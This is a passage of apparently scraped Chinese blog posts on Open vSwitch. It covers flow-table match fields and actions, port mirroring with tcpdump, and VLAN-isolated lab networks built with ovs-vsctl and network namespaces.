TCP（或UDP或SCTP）源或目标端口上的按位匹配。端口和掩码是16位数字，以十进制或十六进制写为0x。掩码中的每个1位要求端口中的相应位必须匹配。掩码中的每个0位都会导致忽略相应的位。\n传输端口上的按位匹配很少在隔离中有用，但是可以使用一组匹配项来减少在一系列传输端口上进行匹配所需的流数。例如，假设目标是将TCP源端口1000匹配到1999（含）。一种方法是插入1000个流，每个流在单个源端口上匹配。另一种方法是查看1000和1999的二进制表示形式，如下所示：\n01111101000 11111001111 然后将其转换为一系列按位匹配，以实现相同的结果：\n01111101xxx 0111111xxxx 10xxxxxxxxx 110xxxxxxxx 1110xxxxxxx 11110xxxxxx 1111100xxxx 使用ovs-ofctl所需的语法编写时，这些内容如下：\ntcp,tcp_src=0x03e8/0xfff8 tcp,tcp_src=0x03f0/0xfff0 tcp,tcp_src=0x0400/0xfe00 tcp,tcp_src=0x0600/0xff00 tcp,tcp_src=0x0700/0xff80 tcp,tcp_src=0x0780/0xffc0 tcp,tcp_src=0x07c0/0xfff0 仅Open vSwitch 1.6和更高版本支持传输端口上的按位匹配。\n与上述完全匹配形式一样，按位匹配形式仅在dl_type和nw_proto指定TCP或UDP或SCTP时适用。\ntp_src=port tp_dst=port 这些是L4端口匹配项已弃用的通用形式。在新代码中，请使用上述特定于TCP，UDP或SCTP的形式。\ntcp_flags=flags/mask tcp_flags=[+flag\u0026hellip;][-flag\u0026hellip;] TCP标志按位匹配。标志和掩码是16位数字，以十进制或以0x为前缀的十六进制表示。掩码中的每个1位要求标志中的相应位必须匹配。掩码中的每个0位都会导致忽略相应的位。 或者，可以通过标志的符号名（在下面列出）来指定标志，每个标志名的前面都带有+，表示必须设置的标志，或者-表示必须取消设置的标志，且标志之间没有其他定界符。未提及的标志是通配符。例如，tcp，tcp_flags = + syn-ack匹配不是ACK的TCP SYN。 TCP协议当前定义9个标志位，并保留另外3个位（必须作为零发送），请参阅RFC 793、3168和3540。这些标志位的编号从最低有效位开始：\n 0：fin 查找不再有来自发送方的数据。 1：syn 同步同步序列号。 2：rst 重置连接。 3：psh 推送功能。 4：ack 确认字段有效。 5：urg 紧急指针字段有效。 6：ece ECN回显。 7：cer 减少拥塞窗口。 8：ns 现时总和 9-11：保留。 12-15：不处理，必须为零。  icmp_type=type icmp_code=code 当dl_type和nw_proto指定ICMP或ICMPv6时，type匹配ICMP类型，而代码匹配ICMP代码。每个参数都指定为介于0和255之间（含两端）的十进制数。\n当dl_type和nw_proto采用其他值时，这些设置的值将被忽略（请参见上面的流语法）。\nmetadata=value[/mask] 在元数据字段中完全匹配值或使用可选掩码匹配值。 value和mask是64位整数，默认情况下为十进制（使用0x前缀指定十六进制）。允许使用任意掩码值：掩码中的1位表示值中的对应位必须完全匹配，而该位则使用0位通配符。在Open vSwitch 1.8中添加了对元数据的匹配。\nip 等同于dl_type=0x0800\nipv6 等同于dl_type=0x86dd\nicmp 等同于dl_type=0x0800,nw_proto=1\nicmp6 等同于dl_type=0x86dd,nw_proto=58\ntcp 等同于dl_type=0x0800,nw_proto=6\ntcp6 等同于dl_type=0x86dd,nw_proto=6\nudp 等同于dl_type=0x0800,nw_proto=17\nudp6 等同于dl_type=0x86dd,nw_proto=17\nsctp 等同于dl_type=0x0800,nw_proto=132\nsctp6 等同于dl_type=0x86dd,nw_proto=132\narp 等同于dl_type=0x0806\nrarp 等同于dl_type=0x8035\nmpls 等同于dl_type=0x8847\nmplsm 等同于dl_type=0x8848\nvlan_tci=tci[/mask] 匹配修改后的VLAN TCI tci。如果省略mask，则tci是要匹配的确切VLAN TCI；如果指定了mask，则mask中的1位表示tci中的对应位必须完全匹配，而0位通配符表示该位。 tci和mask均为16位值，默认情况下为十进制。使用0x前缀以十六进制指定它们。\n对于没有802.1Q标头的数据包，vlan_tci与之匹配的值为0。否则，它是802.1Q标头中的TCI值，其中CFI位（值为0x1000）被强制为1。\n  vlan_tci=0 仅匹配没有802.1Q标头的数据包。\n  vlan_tci=0xf123 匹配VLAN 0x123中标记为优先级7的数据包。\n  vlan_tci=0x1123/0x1fff 匹配标记有VLAN 0x123（和任何优先级）的数据包。\n  vlan_tci=0x5000/0xf000 匹配标记为优先级2的数据包（在任何VLAN中）。\n  vlan_tci=0/0xfff 匹配没有802.1Q标头或带有VLAN 0（和任何优先级）标记的数据包。\n  vlan_tci=0x5000/0xe000 匹配没有802.1Q标头或带有优先级2标记的数据包（在任何VLAN中）。\n  vlan_tci=0/0xefff 匹配没有802.1Q标头或带有VLAN 0和优先级0标记的数据包。\n  使用dl_vlan和dl_vlan_pcp也可以实现某些匹配可能性。\nip_frag=frag_type 当dl_type指定IP或IPv6时，frag_type指定要匹配的IP片段或非片段类型。支持以下frag_type值：\n  no\n仅匹配非分段数据包。\n  yes\n匹配所有片段。\n  first\n仅匹配偏移量为0的片段。\n  later\n仅匹配非零偏移量的片段。\n  not_later 匹配零碎的非碎片数据包和碎片。\n  arp_spa=ip[/netmask] arp_tpa=ip[/netmask] 当dl_type指定ARP或RARP时，arp_spa和arp_tpa分别与源和目标IPv4地址匹配。可以将地址指定为IP地址或主机名（例如192.168.1.1或www.example.com）。可选的网络掩码允许将匹配限制为IPv4地址前缀。网络掩码可以指定为点分四边形（例如192.168.1.0/255.255.255.0）或CIDR块（例如192.168.1.0/24）。\narp_sha=xx:xx:xx:xx:xx:xx arp_tha=xx:xx:xx:xx:xx:xx 当dl_type指定ARP或RARP时，arp_sha和arp_tha分别匹配源和目标硬件地址。地址指定为以冒号分隔的6对十六进制数字（例如00:0A:E4:25:6B:B0）。\narp_sha=xx:xx:xx:xx:xx:xx/xx:xx:xx:xx:xx:xx arp_tha=xx:xx:xx:xx:xx:xx/xx:xx:xx:xx:xx:xx 当dl_type指定ARP或RARP时，arp_sha和arp_tha分别匹配源和目标硬件地址。地址指定为以冒号分隔的6对十六进制数字（例如00:0A:E4:25:6B:B0），并在斜杠后加上通配符掩码。\narp_op=opcode 当dl_type指定ARP或RARP时，arp_op与ARP操作码匹配。只能指定1到255之间的ARP操作码进行匹配。\nipv6_src=ipv6[/netmask] ipv6_dst=ipv6[/netmask] 当dl_type为0x86dd时（可能通过简写形式，例如ipv6或tcp6），匹配IPv6源（或目标）地址ipv6，该地址可以按RFC 2373中的规定指定。首选格式为x❌x❌x❌x:x，其中x是地址的八个16位块的十六进制值。 ::的单个实例可用于指示16位零的多个组。可选的网络掩码允许将匹配限制为IPv6地址前缀。网络掩码被指定为IPv6地址（例如2001:db8:3c4d:1::/ffff:ffff:ffff:ffff::)或CIDR块（例如2001:db8:3c4d:1::/64）。打开vSwitch 1.8及更高版本，支持仲裁掩码；早期版本仅支持CIDR掩码，即CIDR块和等同于CIDR块的IPv6地址。\nipv6_label=label 当dl_type为0x86dd时（可能通过简写形式，例如ipv6或tcp6），匹配IPv6流标签label。\ntun_id=tunnel-id[/mask] ###tunnel_id=tunnel-id[/mask]\n匹配隧道标识符tunnel-id。只有通过带有密钥的隧道到达的数据包（例如具有RFC 2890密钥扩展名和非零密钥值的GRE）才会具有非零的隧道ID。如果省略mask，则tunnel-id是要匹配的确切隧道ID；如果指定了mask，则mask中的1位表示tunnel-id中的相应位必须完全匹配，而0位通配符则将该位匹配。\ntun_flags=flags 匹配标志，指示隧道封装的各个方面。当前，仅定义一个标志：\n  oma\n隧道协议指示这是一个OAM控制数据包。\n  可以在标志前面加上+或-来分别指示该标志应匹配为存在或不存在。另外，可以指定没有前缀的标志，并用|分隔。表示完全匹配。\n请注意，较新版本的Open vSwitch可能会引入具有不同含义的其他标志。因此，不建议在此字段上使用完全匹配，因为这些新标志的行为是未知的，应忽略。\n对于非隧道数据包，该值为0。\n此字段是在Open vSwitch 2.5中引入的。\ntun_src=ip[/netmask] tun_dst=ip[/netmask] 匹配隧道IPv4源（或目标）地址ip。仅通过隧道到达的数据包将具有非零的隧道地址。该地址可以指定为IP地址或主机名（例如192.168.1.1或www.example.com）。可选的网络掩码允许将匹配限制为被掩码的IPv4地址。子网掩码可以指定为点分四边形（例如192.168.1.0/255.255.255.0）或CIDR块（例如192.168.1.0/24）。\nipv6 等同于dl_type=0x86dd\ntcp6 等同于dl_type=0x86dd,nw_proto=6\nudp6 等同于dl_type=0x86dd,nw_proto=17\nsctp6 等同于dl_type=0x86dd,nw_proto=132\nicmp6 等同于dl_type=0x86dd,nw_proto=58\n流表动作 满足匹配条件之后将会执行的动作。\noutput:port 将数据包输出到OpenFlow端口号port。如果port是数据包的输入端口，则不输出数据包。\ngroup:group_id 将数据包输出到OpenFlow组group_id。仅OpenFlow 1.1+支持组表。有关更多详细信息，请参见组语法。\nnormal 使数据包经过设备的常规L2 / L3处理。 （并非所有OpenFlow交换机都执行此操作。）\nflood 在所有交换机物理端口上输出数据包，而不是在接收数据包的端口以及任何禁用洪泛的端口上进行输出（通常，这些端口是IEEE 802.1D生成树协议禁用的端口）。\nall 在所有交换机物理端口上输出数据包，而不是在接收数据包的端口上。\nlocal 在与本地网桥名称相同的网络设备对应的``本地端口'\u0026lsquo;上输出数据包。\nin_port 在接收数据包的端口上输出数据包。\nenqueue(port,queue) 将数据包放入端口port中的指定队列中，该队列必须是OpenFlow端口号或关键字（例如LOCAL）。支持的队列数取决于交换机；具体取决于交换机。一些OpenFlow实现根本不支持排队。\ndrop 丢弃数据包，因此不会进行进一步的处理或转发。如果使用丢弃动作，则不能指定其他动作。\nmod_vlan_vid:vlan_vid 修改报文的VLAN ID。根据需要添加或修改VLAN标记以匹配指定的值。如果添加了VLAN标记，则使用零优先级（请参阅mod_vlan_pcp操作来设置此优先级）。\nmod_vlan_pcp:vlan_pcp 修改报文的VLAN优先级。根据需要添加或修改VLAN标记以匹配指定的值。有效值介于0（最低）和7（最高）之间。如果添加了VLAN标记，则使用的vid为零（请参阅mod_vlan_vid操作进行设置）。\nstrip_vlan 从数据包中剥离VLAN标记（如果存在）。\npush_vlan:ethertype 将新的VLAN标签推入数据包。以太网类型用作标签的以太网类型。仅应使用ethertype 0x8100。 （目前尚不支持规范允许的0x88a8。）新标签使用优先级为零且标签为零。\nmod_dl_src:mac 将源以太网地址设置为mac。\nmod_dl_dst:mac 将目标以太网地址设置为mac。\nmod_nw_src:ip 将IPv4源地址设置为ip。\nmod_nw_dst:ip 将IPv4目标地址设置为ip。\nmod_tp_src:port 将TCP或UDP或SCTP源端口设置为port。\nmod_tp_dst:port 将TCP或UDP或SCTP目标端口设置为port。\nmod_nw_tos:tos 将IPv4 ToS / DSCP或IPv6流量类字段中的DSCP位设置为tos，该值必须为0到255之间的4的倍数。此操作不会修改ToS字段的两个最低有效位（ECN位）。\nmod_nw_ecn:ecn 将IPv4 ToS或IPv6流量类别字段中的ECN比特设置为ecn，该值必须介于0和3之间（包括0和3）。此操作不会修改该字段的六个最高有效位（DSCP位）。\n需要OpenFlow 1.1或更高版本。\nmod_nw_ttl:ttl 将IPv4 TTL或IPv6跳数限制字段设置为ttl，指定为0到255之间的十进制数（包括0和255）。但是，没有很好地指定将ttl设置为零时的开关行为。\n需要OpenFlow 1.1或更高版本。\nresubmit:port resubmit([port],[table]) 重新搜索此OpenFlow流表（或由表指定其编号的表），用in_port字段替换为端口（如果指定了port），并执行找到的操作（如果有），以及此流条目中的任何其他操作。\nset_tunnel:id set_tunnel64:id 如果输出到将数据包封装在隧道中并支持标识符（例如GRE）的端口，则将标识符设置为id。如果使用set_tunnel形式，并且id可以容纳32位，则此操作将使用Open vSwitch 1.0和更高版本支持的操作扩展。否则，如果id是64位值，则需要Open vSwitch 1.1或更高版本。\nset_queue:queue 设置输出数据包时应用于排队的队列。支持的队列数取决于交换机；具体取决于交换机。一些OpenFlow实现根本不支持排队。\npop_queue 将队列恢复为应用任何set_queue操作之前的值。\nmove:src[start..end]-\u0026gt;dst[start..end] 将已命名的位从字段src复制到字段dst。 src和dst必须是nicira-ext.h中定义的NXM字段名称，例如NXM_OF_UDP_SRC或NXM_NX_REG0。每个开始和结束对（包括首尾对）必须指定相同的位数，并且必须适合其各自的字段。存在[start..end]的简写形式：使用[bit]指定单个位，或使用[]指定整个字段。\nset_field:value[/mask]-\u0026gt;dst load:value−\u0026gt;dst[start..end] 将文字值加载到字段或字段的一部分中。对于set_field，在字段dst的惯用语法中给出了值和可选掩码，表示为字段名。例如，set_field：00：11：22：33：44：55-\u0026gt; eth_src将以太网源地址设置为00：11：22：33：44：55。加载时，值必须是整数值（十进制或以0x开头的十六进制前缀），而dst是该字段的NXM或OXM名称。例如，load：0x001122334455-\u0026gt; OXM_OF_ETH_DST []与前面的set_field示例具有相同的效果。\n出于历史原因，存在这两种形式。 Open vSwitch 1.1引入了NXAST_REG_LOAD作为OpenFlow 1.0的Nicira扩展，并使用load来表达它。后来，Open-Flow 1.2引入了一个标准的OFPAT_SET_FIELD操作，该操作仅限于加载整个字段，因此Open vSwitch添加了具有此限制的表单set_field。 OpenFlow 1.5将OFPAT_SET_FIELD扩展到了它成为NXAST_REG_LOAD的超集的地步。 Open vSwitch会根据所使用的OpenFlow版本转换两种语法：OpenFlow 1.0和1.1中的NXAST_REG_LOAD；在OpenFlow 1.2、1.3和1.4中，NXAST_REG_LOAD用于加载或加载子字段，否则为OFPAT_SET_FIELD； OpenFlow 1.5及更高版本，OFPAT_SET_FIELD。\npush:src[start..end] 在堆栈顶部的字段中，压入开始（包括结束）位。\n示例：push：NXM_NX_REG2 [0..5]将存储在寄存器2位0到5（含0和5）中的值压入内部堆栈。\npop:dst[start..end] 从堆栈的顶部弹出，从弹出的值中检索包含开始到结束的位，并将它们存储在dst中的相应位中。\n示例：pop：NXM_NX_REG2 [0..5]从堆栈顶部弹出该值。根据刚刚弹出的值的0至5位，将寄存器2的0至5位（包括0和5）设置为1。\nmultipath(fields,basis,algorithm,n_links,arg,dst[start..end]) 使用base作为通用哈希参数对字段进行哈希处理，然后应用多路径链接选择算法（带有参数arg）从0到n_links减去1来选择n_links输出链接之一，并将链接存储到dst [start..end]中，它必须是如上所述的NXM字段。\n其他的请参考官方操作手册 ","permalink":"https://typesafe.cn/posts/ovs-learn-5/","summary":"OpenvSwitch flow table 流表  OpenFlow（OF）被认为是第一个软件定义网络（SDN）标准之一。它最初在SDN环境中定义了通信协议，使SDN控制器能够与物理和虚拟的交换机和路由器等网络设备的转发平面直接进行交互，从而更好地适应不断变化的业务需求。\n 如果把OpenFlow控制器比作“大脑”，OVS流表就像是“大腿”一样接受来自“大脑”的指令，决定要向哪个方向前进。但OVS流表功能更加强大，在没有OpenFlow控制器时，也可以自主工作，它本身也供一些命令让我们可以直接管理流表。\n操作命令 查看流表规则 # 查看br-tun上的全部流表规则 ovs-ofctl dump-flows br-tun 添加或修改流表规则 ovs-ofctl add−flow／add−flows／mod−flows “流表匹配条件,actions=[动作1][,动作2…]” 如果你有过编程的经验，流表规则其实就是一个个简单的if语句，伪代码如下。\nif (流表匹配条件){ 动作1， 动作2... } if (流表匹配条件){ 动作1， 动作2... } 删除流表规则 # 删除br-tun上的全部流表规则 ovs-ofctl del-flows br-tun # 删除br-tun上匹配xx的全部流表规则 ovs-ofctl del-flows br-tun xx 流表匹配条件 OVS 流表匹配条件较多，下面我将其分成四部分来说明，分别是:\n OVS匹配条件 OSI模型第二层【数据链路层】 OSI模型第三层【网络层】 OSI模型第四层【传输层】  OVS匹配条件 in_port=port 流量进入的端口编号或者名称，示例 in_port=br-int\ntable=number 规则保存的流表编号，范围是 0-254，默认值：0。\nOSI模型第二层【数据链路层】 dl 即是 data link 的缩写。\ndl_type=ethertype 匹配以太网协议类型以太类型，以10到65535之间的整数（包括0和65535）指定，以十进制或以0x前缀的十六进制数表示，示例如下。\n  dl_type=0x0800 匹配IPv4数据包，等同于dl_type=ip 。","title":"Open vSwitch 入门实践（5）OVS Flow Table 流表规则"},{"content":"前言 当我们想要在不影响虚拟网络设备数据报文收发的情况下获取对应虚拟网络设备的流量时，端口镜像是一个很好的选择。端口镜像是指将经过指定端口（镜像端口）的报文复制一份到另一个指定端口（观察端口），通过观察端口接收到的数据报文，就可以有效识别虚拟网络的运行情况。\nOVS提供了相关命令来配置或删除端口镜像，下面我们来实验一下。\n如何使用 端口镜像类型 端口镜像分为镜像源和镜像目的两部分。\n镜像源  select_all：布尔类型（true，false）。设置为 true 时，表示此网桥上的所有流量。 select_dst_port：字符串（端口名称）。表示此端口接收的所有流量。 select_src_port：字符串（端口名称）。表示此端口发送的所有流量。 select_vlan：整型（0-4095）。表示携带此VLAN标签的流量。  镜像目的  output_port：字符串（端口名称）。接收流量报文的观察端口。 output_vlan：整型（0-4095）。表示只修改VLAN标签，原VLAN标签会被剥离。  基础操作命令 新增端口镜像\novs-vsctl -- set Bridge \u0026lt;bridge_name\u0026gt; mirrors=@m \\  -- --id=@\u0026lt;port0\u0026gt; get Port \u0026lt;port0\u0026gt; \\  -- --id=@\u0026lt;port1\u0026gt; get Port \u0026lt;port1\u0026gt; \\  -- --id=@m create Mirror name=\u0026lt;mirror_name\u0026gt; select-dst-port=@\u0026lt;port0\u0026gt; select-src-port=@\u0026lt;port0\u0026gt; output-port=@\u0026lt;port1\u0026gt;  这行命令会输出一个镜像ID\n 删除端口镜像\novs-vsctl remove Bridge \u0026lt;bridge-name\u0026gt; mirrors \u0026lt;mirror-id\u0026gt; 在原端口镜像的基础上增加一个镜像源\n# 获取端口的ID ovs-vsctl get port \u0026lt;port_name\u0026gt; _uuid # 在原端口镜像的基础上增加镜像源 ovs-vsctl add Mirror \u0026lt;mirror-name\u0026gt; select_src_port \u0026lt;port-id\u0026gt; ovs-vsctl add Mirror \u0026lt;mirror-name\u0026gt; select_dst_port \u0026lt;port-id\u0026gt; 在原端口镜像的基础上删除一个镜像源\n# 获取端口的ID ovs-vsctl get port \u0026lt;port_name\u0026gt; _uuid ovs-vsctl remove Mirror \u0026lt;mirror-name\u0026gt; select_src_port \u0026lt;port-id\u0026gt; ovs-vsctl remove Mirror \u0026lt;mirror-name\u0026gt; select_dst_port \u0026lt;port-id\u0026gt; 清空端口镜像\novs-vsctl clear Mirror 查看端口镜像\novs-vsctl list Mirror 关闭端口的MAC地址学习\novs-ofctl mod-port \u0026lt;bridge-name\u0026gt; \u0026lt;port-name\u0026gt; NO-FLOOD 实验 实验拓扑 实验拓扑分为一个网桥，三个虚拟网络设备，\n# 添加网桥 ovs-vsctl add-br br-int # 添加三个内部端口 ovs-vsctl add-port br-int vnet0 -- set Interface vnet0 type=internal ovs-vsctl add-port br-int vnet1 -- set Interface vnet1 type=internal ovs-vsctl add-port br-int vnet2 -- set Interface vnet2 type=internal # 添加三个netns ip netns add ns0 ip netns add ns1 ip netns add ns2 # 将内部端口分别移动到netns中 ip link set vnet0 netns ns0 ip link set vnet1 netns ns1 ip link set vnet2 netns ns2 # 启动端口并配置IP ip netns exec ns0 ip link set lo up ip netns exec ns0 ip link set vnet0 up ip netns exec ns0 ip addr add 10.0.0.1/24 dev vnet0 ip netns exec ns1 ip link set lo up ip netns exec ns1 ip link set vnet1 up ip netns exec ns1 ip addr add 10.0.0.2/24 dev vnet1 # 注意这里只启动了网卡，但没有配置IP ip netns exec ns2 ip link set lo up ip netns exec ns2 ip link set vnet2 up ovs-vsctl -- set Bridge br-int mirrors=@m \\  -- --id=@vnet1 get Port vnet1 \\  -- --id=@vnet2 get Port vnet2 \\  -- --id=@m create Mirror name=mirror_test select-dst-port=@vnet1 select-src-port=@vnet1 output-port=@vnet2 测试 执行以下命令产生流量\nip netns exec ns0 ping 10.0.0.2 重新打开一个终端执行以下命令抓包\nip netns exec ns2 tcpdump -i vnet2  需要安装tcpdump才能使用\n 输出\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on vnet2, link-type EN10MB (Ethernet), capture size 262144 bytes 22:26:31.140974 IP 10.0.0.1 \u0026gt; 10.0.0.2: ICMP echo request, id 4599, seq 23, length 64 22:26:31.140996 IP 10.0.0.2 \u0026gt; 10.0.0.1: ICMP echo reply, id 4599, seq 23, length 64 22:26:32.141066 IP 10.0.0.1 \u0026gt; 10.0.0.2: ICMP echo request, id 4599, seq 24, length 64 22:26:32.141085 IP 10.0.0.2 \u0026gt; 10.0.0.1: ICMP echo reply, id 4599, seq 24, length 64 22:26:33.141066 IP 10.0.0.1 \u0026gt; 10.0.0.2: ICMP echo request, id 4599, seq 25, length 64 22:26:33.141108 IP 10.0.0.2 \u0026gt; 10.0.0.1: ICMP echo reply, id 4599, seq 25, length 64 22:26:34.141044 IP 10.0.0.1 \u0026gt; 10.0.0.2: ICMP echo request, id 4599, seq 26, length 64 22:26:34.141062 IP 10.0.0.2 \u0026gt; 10.0.0.1: ICMP echo reply, id 4599, seq 26, length 64 ^C 8 packets captured 8 packets received by filter 0 packets dropped by kernel 清理实验环境 ip netns del ns0 ip netns del ns1 ip netns del ns2 ovs-vsctl del-br br-int ","permalink":"https://typesafe.cn/posts/ovs-learn-4/","summary":"前言 当我们想要在不影响虚拟网络设备数据报文收发的情况下获取对应虚拟网络设备的流量时，端口镜像是一个很好的选择。端口镜像是指将经过指定端口（镜像端口）的报文复制一份到另一个指定端口（观察端口），通过观察端口接收到的数据报文，就可以有效识别虚拟网络的运行情况。\nOVS提供了相关命令来配置或删除端口镜像，下面我们来实验一下。\n如何使用 端口镜像类型 端口镜像分为镜像源和镜像目的两部分。\n镜像源  select_all：布尔类型（true，false）。设置为 true 时，表示此网桥上的所有流量。 select_dst_port：字符串（端口名称）。表示此端口接收的所有流量。 select_src_port：字符串（端口名称）。表示此端口发送的所有流量。 select_vlan：整型（0-4095）。表示携带此VLAN标签的流量。  镜像目的  output_port：字符串（端口名称）。接收流量报文的观察端口。 output_vlan：整型（0-4095）。表示只修改VLAN标签，原VLAN标签会被剥离。  基础操作命令 新增端口镜像\novs-vsctl -- set Bridge \u0026lt;bridge_name\u0026gt; mirrors=@m \\  -- --id=@\u0026lt;port0\u0026gt; get Port \u0026lt;port0\u0026gt; \\  -- --id=@\u0026lt;port1\u0026gt; get Port \u0026lt;port1\u0026gt; \\  -- --id=@m create Mirror name=\u0026lt;mirror_name\u0026gt; select-dst-port=@\u0026lt;port0\u0026gt; select-src-port=@\u0026lt;port0\u0026gt; output-port=@\u0026lt;port1\u0026gt;  这行命令会输出一个镜像ID\n 删除端口镜像\novs-vsctl remove Bridge \u0026lt;bridge-name\u0026gt; mirrors \u0026lt;mirror-id\u0026gt; 在原端口镜像的基础上增加一个镜像源\n# 获取端口的ID ovs-vsctl get port \u0026lt;port_name\u0026gt; _uuid # 在原端口镜像的基础上增加镜像源 ovs-vsctl add Mirror \u0026lt;mirror-name\u0026gt; select_src_port \u0026lt;port-id\u0026gt; ovs-vsctl add Mirror \u0026lt;mirror-name\u0026gt; select_dst_port \u0026lt;port-id\u0026gt; 在原端口镜像的基础上删除一个镜像源","title":"Open vSwitch 入门实践（4）使用OVS配置端口镜像"},{"content":"使用OVS构建分布式隔离网络 前言 上一节我们使用OVS构建了单机隔离网络，但是随着网络规模的扩张，单节点已经不再能满足业务的需要，分布式网络成了必不可少的环节。分布式网络与单节点网络在细节实现上基本一致，只有物理环境网络连线上的一点区别。\n实验1：分布式无隔离网络 网络拓扑如下图所示，我们每一台节点都有两张网卡，一张用于管理，一张用于业务。之所以使用两张网卡有两个原因：\n 管理网卡用于日常的维护登录，业务网卡用于传输虚拟节点的数据报文，避免相互之间影响。 我们要将业务网卡绑定到OVS网桥上，也就是Normal类型的Port。这种方式添加的Port不支持分配IP地址，如果之前网卡上配置的有IP，挂载到OVS上面之后将不可访问。   需要注意的是，如果是使用物理环境搭建网络拓扑，需要把业务网卡对应的交换机端口配置为trunk模式。如果是使用VmWare搭建网络拓扑，业务网卡需要配置网络类型为仅主机模式。\n 配置  配置环境 主机A  ovs-vsctl add-br br-int # 请修改eth1为当前实验环境的业务网卡名称 ovs-vsctl add-port br-int eth1 # 添加两个内部端口 ovs-vsctl add-port br-int vnet0 -- set Interface vnet0 type=internal ovs-vsctl add-port br-int vnet1 -- set Interface vnet1 type=internal # 添加两个netns ip netns add ns0 ip netns add ns1 # 将内部端口分别移动到netns中 ip link set vnet0 netns ns0 ip link set vnet1 netns ns1 # 启动端口并配置IP ip netns exec ns0 ip link set lo up ip netns exec ns0 ip link set vnet0 up ip netns exec ns0 ip addr add 10.0.0.1/24 dev vnet0 ip netns exec ns1 ip link set lo up ip netns exec ns1 ip link set vnet1 up ip netns exec ns1 ip addr add 10.0.0.2/24 dev vnet1  配置环境 主机B  ovs-vsctl add-br br-int # 请修改eth1为当前实验环境的业务网卡名称 ovs-vsctl add-port br-int eth1 # 添加两个内部端口 ovs-vsctl add-port br-int vnet0 -- set Interface vnet0 type=internal ovs-vsctl add-port br-int vnet1 -- set Interface vnet1 type=internal # 添加两个netns ip netns add ns0 ip netns add ns1 # 将内部端口分别移动到netns中 ip link set vnet0 netns ns0 ip link set vnet1 netns ns1 # 启动端口并配置IP ip netns exec ns0 ip link set lo up ip netns exec ns0 ip link set vnet0 up ip netns exec ns0 ip addr add 10.0.0.3/24 dev vnet0 ip netns exec ns1 ip link set lo up ip netns exec ns1 ip link set vnet1 up ip netns exec ns1 ip addr add 10.0.0.4/24 dev vnet1 测试  测试 主机A  ip netns exec ns0 ping 10.0.0.3 ip netns exec ns0 ping 10.0.0.4 ip netns exec ns1 ping 10.0.0.3 ip netns exec ns1 ping 10.0.0.4  测试 主机B  ip netns exec ns0 ping 10.0.0.1 ip netns exec ns0 ping 10.0.0.2 ip netns exec ns1 ping 10.0.0.1 ip netns exec ns1 ping 10.0.0.2  测试结果     主机A 主机B ping 结果     ns0 ns0 可通信 ✅   ns0 ns1 可通信 ✅   ns1 ns0 可通信 ✅   ns1 ns1 可通信 ✅    根据测试结果可以看到我们使用OVS成功的联通了分布在不同主机上的虚拟网络设备。\n实验2：分布式隔离网络 构建分布式隔离网络和单节点的操作方法一致，即给对应的端口配置VLAN tag。如下图所示，我们分别给主机A、B上的端口配置VLAN tag为100和200。\n配置  配置环境 主机A  ovs-vsctl set Port vnet0 tag=100 ovs-vsctl set Port vnet1 tag=200  配置环境 主机B  ovs-vsctl set Port vnet0 tag=100 ovs-vsctl set Port vnet1 tag=200 测试  测试 主机A  ip netns exec ns0 ping 10.0.0.3 ip netns exec ns0 ping 10.0.0.4 ip netns exec ns1 ping 10.0.0.3 ip netns exec ns1 ping 10.0.0.4  测试 主机B  ip netns exec ns0 ping 10.0.0.1 ip netns exec ns0 ping 10.0.0.2 ip netns exec ns1 ping 10.0.0.1 ip netns exec ns1 ping 10.0.0.2  测试结果     主机A 主机B ping 结果     ns0 ns0 可通信 ✅   ns0 ns1 不通信 ❌   ns1 ns0 不通信 ❌   ns1 ns1 可通信 ✅    根据测试结果可以看到我们使用OVS成功的隔离了分布在不同主机上的虚拟网络设备。\n","permalink":"https://typesafe.cn/posts/ovs-learn-3/","summary":"使用OVS构建分布式隔离网络 前言 上一节我们使用OVS构建了单机隔离网络，但是随着网络规模的扩张，单节点已经不再能满足业务的需要，分布式网络成了必不可少的环节。分布式网络与单节点网络在细节实现上基本一致，只有物理环境网络连线上的一点区别。\n实验1：分布式无隔离网络 网络拓扑如下图所示，我们每一台节点都有两张网卡，一张用于管理，一张用于业务。之所以使用两张网卡有两个原因：\n 管理网卡用于日常的维护登录，业务网卡用于传输虚拟节点的数据报文，避免相互之间影响。 我们要将业务网卡绑定到OVS网桥上，也就是Normal类型的Port。这种方式添加的Port不支持分配IP地址，如果之前网卡上配置的有IP，挂载到OVS上面之后将不可访问。   需要注意的是，如果是使用物理环境搭建网络拓扑，需要把业务网卡对应的交换机端口配置为trunk模式。如果是使用VmWare搭建网络拓扑，业务网卡需要配置网络类型为仅主机模式。\n 配置  配置环境 主机A  ovs-vsctl add-br br-int # 请修改eth1为当前实验环境的业务网卡名称 ovs-vsctl add-port br-int eth1 # 添加两个内部端口 ovs-vsctl add-port br-int vnet0 -- set Interface vnet0 type=internal ovs-vsctl add-port br-int vnet1 -- set Interface vnet1 type=internal # 添加两个netns ip netns add ns0 ip netns add ns1 # 将内部端口分别移动到netns中 ip link set vnet0 netns ns0 ip link set vnet1 netns ns1 # 启动端口并配置IP ip netns exec ns0 ip link set lo up ip netns exec ns0 ip link set vnet0 up ip netns exec ns0 ip addr add 10.","title":"Open vSwitch 入门实践（3）使用OVS构建分布式隔离网络"},{"content":"前言 在前面我们已经使用Linux Bridge完成了多台网络设备的通信，但是它对于网络隔离的支持不是很好，长期以来，在Linux平台上缺少一个功能完备的虚拟交换机，直到OVS的出现。\n实验 接下来我们来尝试完成两个实验，单机无隔离网络、单机隔离网络。\n实验一：单机无隔离网络 使用ovs构建无隔离网络非常简单，只需要添加一个网桥，然后在这个网桥上再增加几个内部端口，最后把端口移动到netns中即可。\n# 添加网桥 ovs-vsctl add-br br-int # 添加三个内部端口 ovs-vsctl add-port br-int vnet0 -- set Interface vnet0 type=internal ovs-vsctl add-port br-int vnet1 -- set Interface vnet1 type=internal ovs-vsctl add-port br-int vnet2 -- set Interface vnet2 type=internal # 添加三个netns ip netns add ns0 ip netns add ns1 ip netns add ns2 # 将内部端口分别移动到netns中 ip link set vnet0 netns ns0 ip link set vnet1 netns ns1 ip link set vnet2 netns ns2 # 启动端口并配置IP ip netns exec ns0 ip link set lo up ip netns exec ns0 ip link set vnet0 up ip netns exec ns0 ip addr add 10.0.0.1/24 dev vnet0 ip netns exec ns1 ip link set lo up ip netns exec ns1 ip link set vnet1 up ip netns exec ns1 ip addr add 10.0.0.2/24 dev vnet1 ip netns exec ns2 ip link set lo up ip netns exec ns2 ip link set vnet2 up ip netns exec ns2 ip addr add 10.0.0.3/24 dev vnet2 测试\n测试ns0和ns1能否通信ip netns exec ns0 ping 10.0.0.2\nPING 10.0.0.2 (10.0.0.2) 56(84) bytes of data. 64 bytes from 